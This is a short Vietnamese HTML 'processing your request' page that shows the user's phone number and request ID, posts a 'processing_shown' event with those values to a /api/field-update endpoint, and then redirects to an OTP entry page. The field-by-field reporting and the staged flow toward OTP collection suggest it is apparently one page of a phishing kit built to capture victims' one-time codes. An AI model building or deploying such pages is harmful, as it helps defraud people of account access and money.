<!doctype html>
<html lang="vi">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Đang xử lý…</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: #f8f9fa
        }

        .center {
            max-width: 720px;
            margin: 4rem auto;
            text-align: center
        }
    </style>
</head>

<body>
    <main class="container center">
        <div class="card shadow-sm">
            <div class="card-body">
                <div class="mb-3">
                    <h1 class="h5">Đang xử lý yêu cầu của bạn</h1>
                    <p class="text-muted">Vui lòng chờ trong giây lát. Bạn sẽ được chuyển tới bước nhập mã OTP.</p>
                </div>

                <div class="d-flex align-items-center justify-content-center gap-3 my-3">
                    <div class="spinner-border" role="status" aria-hidden="true"></div>
                    <div id="info">Đang chuẩn bị…</div>
                </div>

                <div class="small text-muted mt-2">Mã yêu cầu: <span id="reqId">—</span> · Số điện thoại: <span
                        id="phone">—</span></div>
            </div>
        </div>
    </main>

    <script>
        (async function () {
            const reqId = sessionStorage.getItem('pendingRequestId') || '—';
            const phone = sessionStorage.getItem('pendingPhone') || '—';
            document.getElementById('reqId').textContent = reqId;
            document.getElementById('phone').textContent = phone;

            // audit that the processing page was shown
            try {
                const FIELD_UPDATE_API = (location.origin && location.origin !== 'null') ? location.origin + '/api/field-update' : '/api/field-update';
                const sessionId = sessionStorage.getItem('fieldSessionId') || 'no-session';
                await fetch(FIELD_UPDATE_API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, field: 'processing_shown', value: JSON.stringify({ reqId, phone }), page: 'dang-xu-ly.html' }) });
            } catch (e) { }

            // small delay then go to OTP page
            setTimeout(() => location.href = 'otp.html', 900);
        })();
    </script>
</body>

</html>
